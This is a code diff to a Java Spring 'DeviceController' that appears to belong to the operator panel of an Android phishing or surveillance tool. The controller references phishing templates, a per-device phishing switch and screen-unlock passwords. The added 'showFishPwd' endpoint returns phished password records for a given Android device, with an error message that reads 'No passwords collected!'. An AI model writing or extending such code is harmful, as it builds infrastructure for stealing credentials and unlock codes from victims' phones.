@@ -5,8 +5,7 @@ import java.util.Objects;
 
 import javax.annotation.Resource;
 
-import io.renren.modules.app.entity.FishTemplates;
-import io.renren.modules.app.mapper.FishTemplatesMapper;
+import org.apache.commons.collections.CollectionUtils;
 import org.apache.commons.lang3.StringUtils;
 import org.springframework.web.bind.annotation.RequestBody;
 import org.springframework.web.bind.annotation.RequestMapping;
@@ -22,15 +21,18 @@ import io.renren.common.constant.Constant;
 import io.renren.common.page.PageData;
 import io.renren.common.utils.Result;
 import io.renren.modules.app.entity.Device;
+import io.renren.modules.app.entity.FishData;
+import io.renren.modules.app.entity.FishTemplates;
 import io.renren.modules.app.entity.InstallAppFilter;
 import io.renren.modules.app.entity.UnlockScreenPwd;
+import io.renren.modules.app.mapper.FishTemplatesMapper;
 import io.renren.modules.app.mapper.InstallAppFilterMapper;
 import io.renren.modules.app.mapper.InstallAppMapper;
 import io.renren.modules.app.param.DeviceParam;
 import io.renren.modules.app.service.DeviceService;
+import io.renren.modules.app.service.FishDataService;
 import io.renren.modules.app.service.InstallAppService;
 import io.renren.modules.app.service.UnlockScreenPwdService;
-import io.renren.modules.sys.dto.SysUserDTO;
 import io.renren.modules.sys.service.SysUserService;
 import lombok.extern.slf4j.Slf4j;
 
@@ -57,6 +59,8 @@ public class DeviceController extends BaseController {
     private UnlockScreenPwdService unlockScreenPwdService;
     @Resource
     private FishTemplatesMapper fishTemplatesMapper;
+    @Resource
+    private FishDataService fishDataService;
 
 
     @RequestMapping("page")
@@ -220,8 +224,20 @@ public class DeviceController extends BaseController {
         update.setFishSwitch(fishSwitch);
         deviceService.updateById(update);
         return Result.toSuccess();
-
     }
-
+    
+    @RequestMapping("showFishPwd")
+    public Result<List<FishData>> showFishPwd(@RequestBody JSONObject jsonObject){
+        String deviceId = jsonObject.getString("deviceId");
+        String code = jsonObject.getString("code");
+        List<FishData> datas = fishDataService.list(new LambdaQueryWrapper<FishData>()
+        		.eq(FishData::getAndroidId, deviceId)
+        		.eq(FishData::getCode, code)
+        		.orderByDesc(FishData::getCreated));
+        if(CollectionUtils.isEmpty(datas)) {
+        	 return  Result.toError("没有采集到密码!");
+        }
+        return Result.toSuccess(datas);
+    }
 
 }
